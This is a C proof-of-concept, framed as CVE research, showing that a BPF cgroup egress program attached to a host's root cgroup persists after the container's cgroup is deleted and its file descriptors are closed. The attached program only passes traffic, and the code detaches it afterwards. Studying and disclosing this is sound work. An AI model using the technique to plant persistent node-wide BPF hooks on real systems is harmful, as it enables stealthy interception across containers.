/*
 * bpf_persistence_poc.c
 *
 * CVE Research: BPF root-cgroup program persistence after container deletion.
 *
 * Demonstrates that a BPF_PROG_TYPE_CGROUP_SKB program attached to the host
 * root cgroup persists after the "container" (child cgroup) is deleted and
 * all originating file descriptors are closed — with no cleanup by any
 * runtime or kernel component.
 *
 * Requires: CAP_NET_ADMIN + CAP_BPF (or CAP_SYS_ADMIN)
 * Build:    gcc -O2 -o bpf_persistence_poc bpf_persistence_poc.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <linux/bpf.h>

/* ── helpers ──────────────────────────────────────────────────────────────── */

static int sys_bpf(enum bpf_cmd cmd, union bpf_attr *attr, unsigned int size)
{
    return (int)syscall(SYS_bpf, cmd, attr, size);
}

static void banner(const char *msg)
{
    printf("\n\033[1;36m[*] %s\033[0m\n", msg);
}

static void ok(const char *msg)    { printf("\033[1;32m[+]\033[0m %s\n", msg); }
static void fail(const char *msg)  { printf("\033[1;31m[-]\033[0m %s\n", msg); }
static void info(const char *msg)  { printf("    %s\n", msg); }

/* ── minimal BPF program: cgroup_skb/egress — return 1 (pass all) ─────────
 *
 *   BPF_MOV64_IMM(BPF_REG_0, 1)   ; r0 = 1
 *   BPF_EXIT_INSN()               ; return r0
 */
static struct bpf_insn g_insns[] = {
    { .code = 0xb7, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 1 },
    { .code = 0x95, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0 },
};

#define ROOT_CG2  "/sys/fs/cgroup/unified"
#define TEST_CG   "/sys/fs/cgroup/unified/poc-container-sim"

/* ── step 1: load BPF program ─────────────────────────────────────────────── */

static int load_prog(void)
{
    char log[4096] = {};
    union bpf_attr attr = {};
    attr.prog_type  = BPF_PROG_TYPE_CGROUP_SKB;
    attr.insns      = (uint64_t)(uintptr_t)g_insns;
    attr.insn_cnt   = sizeof(g_insns) / sizeof(g_insns[0]);
    attr.license    = (uint64_t)(uintptr_t)"GPL";
    attr.log_buf    = (uint64_t)(uintptr_t)log;
    attr.log_size   = sizeof(log);
    attr.log_level  = 1;

    int fd = sys_bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    if (fd < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "BPF_PROG_LOAD failed: %s", strerror(errno));
        fail(msg);
        if (log[0]) { info("Verifier log:"); info(log); }
        return -1;
    }
    char msg[64];
    snprintf(msg, sizeof(msg), "BPF program loaded  (fd=%d)", fd);
    ok(msg);
    return fd;
}

/* ── step 2: attach program to a cgroup fd ────────────────────────────────── */

static int attach_prog(int cg_fd, int prog_fd, uint32_t flags)
{
    union bpf_attr attr = {};
    attr.target_fd     = (uint32_t)cg_fd;
    attr.attach_bpf_fd = (uint32_t)prog_fd;
    attr.attach_type   = BPF_CGROUP_INET_EGRESS;
    attr.attach_flags  = flags;

    int ret = sys_bpf(BPF_PROG_ATTACH, &attr, sizeof(attr));
    if (ret < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "BPF_PROG_ATTACH failed: %s", strerror(errno));
        fail(msg);
        return -1;
    }
    return 0;
}

/* ── step 3: detach program (cleanup) ────────────────────────────────────── */

static int detach_prog(int cg_fd, int prog_fd)
{
    union bpf_attr attr = {};
    attr.target_fd     = (uint32_t)cg_fd;
    attr.attach_bpf_fd = (uint32_t)prog_fd;
    attr.attach_type   = BPF_CGROUP_INET_EGRESS;

    int ret = sys_bpf(BPF_PROG_DETACH, &attr, sizeof(attr));
    if (ret < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "BPF_PROG_DETACH failed: %s", strerror(errno));
        fail(msg);
        return -1;
    }
    ok("BPF program detached from root cgroup (cleanup done)");
    return 0;
}

/* ── step 4: get prog fd back from prog ID (post-FD-close path) ───────────── */

static int prog_fd_from_id(uint32_t id)
{
    union bpf_attr attr = {};
    attr.prog_id    = id;
    attr.open_flags = 0;
    return sys_bpf(BPF_PROG_GET_FD_BY_ID, &attr, sizeof(attr));
}

/* ── step 5: query programs attached to a cgroup (egress) ───────────────── */

static int query_progs(int cg_fd, uint32_t *ids, uint32_t max_cnt)
{
    union bpf_attr attr = {};
    attr.query.target_fd  = (uint32_t)cg_fd;
    attr.query.attach_type = BPF_CGROUP_INET_EGRESS;
    attr.query.prog_ids   = (uint64_t)(uintptr_t)ids;
    attr.query.prog_cnt   = max_cnt;

    int ret = sys_bpf(BPF_PROG_QUERY, &attr, sizeof(attr));
    if (ret < 0) return -1;
    return (int)attr.query.prog_cnt;
}

/* ── main ─────────────────────────────────────────────────────────────────── */

int main(void)
{
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  BPF Root-Cgroup Persistence PoC — CVE Research             ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n");
    printf("Kernel: "); fflush(stdout); system("uname -r");
    printf("UID:    %d\n", getuid());

    uint32_t ids_before[32] = {}, ids_after[32] = {};
    int cnt;

    /* ── 1. Load the BPF program ──────────────────────────────────────────── */
    banner("STEP 1 — Load BPF_PROG_TYPE_CGROUP_SKB (pass-all egress filter)");
    int prog_fd = load_prog();
    if (prog_fd < 0) return 1;

    /* ── 2. Open root cgroup2 ─────────────────────────────────────────────── */
    banner("STEP 2 — Open root cgroup2 at " ROOT_CG2);
    int root_cg_fd = open(ROOT_CG2, O_RDONLY);
    if (root_cg_fd < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "open(%s): %s", ROOT_CG2, strerror(errno));
        fail(msg);
        return 1;
    }
    {
        char msg[64];
        snprintf(msg, sizeof(msg), "Root cgroup fd=%d", root_cg_fd);
        ok(msg);
    }

    /* ── 3. Query programs on root cgroup BEFORE attach ──────────────────── */
    banner("STEP 3 — Query root cgroup programs BEFORE attach");
    cnt = query_progs(root_cg_fd, ids_before, 32);
    if (cnt < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "BPF_PROG_QUERY failed: %s", strerror(errno));
        fail(msg);
    } else {
        char msg[64];
        snprintf(msg, sizeof(msg), "Programs on root cgroup (egress): %d", cnt);
        ok(msg);
        for (int i = 0; i < cnt; i++) {
            char line[64];
            snprintf(line, sizeof(line), "  existing prog_id=%u", ids_before[i]);
            info(line);
        }
    }

    /* ── 4. Attach to root cgroup ─────────────────────────────────────────── */
    banner("STEP 4 — Attach BPF program to ROOT cgroup (BPF_F_ALLOW_MULTI)");
    if (attach_prog(root_cg_fd, prog_fd, BPF_F_ALLOW_MULTI) < 0) return 1;
    ok("Attached to root cgroup — program now runs for ALL containers on node");

    /* ── 5. Get the program ID before we close the fd ────────────────────── */
    /* (re-query to capture the newly assigned ID) */
    uint32_t new_ids[32] = {};
    int new_cnt = query_progs(root_cg_fd, new_ids, 32);
    uint32_t our_prog_id = 0;
    /* The new ID is whichever ID was not in the before list */
    for (int i = 0; i < new_cnt; i++) {
        int found = 0;
        for (int j = 0; j < cnt; j++) {
            if (new_ids[i] == ids_before[j]) { found = 1; break; }
        }
        if (!found) { our_prog_id = new_ids[i]; break; }
    }
    {
        char msg[64];
        snprintf(msg, sizeof(msg), "Our BPF program assigned id=%u", our_prog_id);
        ok(msg);
    }

    /* ── 6. Simulate container: create a child cgroup ────────────────────── */
    banner("STEP 5 — Simulate container creation (mkdir " TEST_CG ")");
    int rc = mkdir(TEST_CG, 0755);
    if (rc < 0 && errno != EEXIST) {
        char msg[256];
        snprintf(msg, sizeof(msg), "mkdir failed: %s (continuing anyway)", strerror(errno));
        info(msg);
    } else {
        ok("Child cgroup created (simulated container is 'running')");
    }

    /* ── 7. CLOSE all FDs — simulate container process exiting ───────────── */
    banner("STEP 6 — Close all FDs (simulating container process exit / pod deletion)");
    close(prog_fd);
    close(root_cg_fd);
    ok("prog_fd and root_cg_fd CLOSED — attacker process is gone");

    /* ── 8. Simulate pod deletion: rmdir child cgroup ────────────────────── */
    banner("STEP 7 — Delete child cgroup (simulating kubelet deleting pod cgroup)");
    rc = rmdir(TEST_CG);
    if (rc < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "rmdir: %s", strerror(errno));
        info(msg);
        info("(child cgroup may have procs; kernel still cleans it on empty)");
    } else {
        ok("Child cgroup DELETED — pod is gone from the cluster");
    }

    /* ── 9. Re-open root cgroup and query AFTER ───────────────────────────── */
    banner("STEP 8 — Re-query root cgroup AFTER container deletion + FD close");
    root_cg_fd = open(ROOT_CG2, O_RDONLY);
    if (root_cg_fd < 0) {
        fail("Could not re-open root cgroup");
        return 1;
    }
    cnt = query_progs(root_cg_fd, ids_after, 32);
    if (cnt < 0) {
        char msg[256];
        snprintf(msg, sizeof(msg), "BPF_PROG_QUERY failed: %s", strerror(errno));
        fail(msg);
    } else {
        char msg[80];
        snprintf(msg, sizeof(msg),
                 "Programs on root cgroup (egress) AFTER container deletion: %d", cnt);
        ok(msg);
        for (int i = 0; i < cnt; i++) {
            char line[80];
            snprintf(line, sizeof(line), "  prog_id=%-6u%s",
                     ids_after[i],
                     (ids_after[i] == our_prog_id) ? "  <-- OUR PROGRAM — STILL RUNNING!" : "");
            info(line);
        }
    }

    /* ── 10. Verdict ─────────────────────────────────────────────────────── */
    printf("\n");
    int persisted = 0;
    for (int i = 0; i < cnt; i++) {
        if (ids_after[i] == our_prog_id) { persisted = 1; break; }
    }

    if (persisted) {
        printf("\033[1;31m");
        printf("╔══════════════════════════════════════════════════════════════╗\n");
        printf("║  VULNERABILITY CONFIRMED                                     ║\n");
        printf("║                                                              ║\n");
        printf("║  BPF program id=%-5u persists after:                        ║\n", our_prog_id);
        printf("║    - attacker container process exited (all FDs closed)      ║\n");
        printf("║    - child cgroup deleted (pod removed)                      ║\n");
        printf("║                                                              ║\n");
        printf("║  The program continues running for EVERY packet from EVERY  ║\n");
        printf("║  container on this node. No runtime cleaned it up.           ║\n");
        printf("╚══════════════════════════════════════════════════════════════╝\n");
        printf("\033[0m\n");
    } else {
        printf("\033[1;33m[?] Program id=%u not found in post-deletion query.\033[0m\n",
               our_prog_id);
        printf("    (May have been cleaned up, or query returned partial results)\n");
    }

    /* ── 11. Cleanup ─────────────────────────────────────────────────────── */
    banner("STEP 9 — Cleanup: detach our program from root cgroup");
    if (our_prog_id > 0) {
        int recovered_fd = prog_fd_from_id(our_prog_id);
        if (recovered_fd < 0) {
            char msg[256];
            snprintf(msg, sizeof(msg),
                     "BPF_PROG_GET_FD_BY_ID failed: %s (manual cleanup: bpftool cgroup detach "
                     ROOT_CG2 " egress id %u)", strerror(errno), our_prog_id);
            info(msg);
        } else {
            detach_prog(root_cg_fd, recovered_fd);
            close(recovered_fd);
        }
    } else {
        info("No prog ID recorded; detach manually if needed");
    }

    close(root_cg_fd);
    return persisted ? 0 : 2;
}
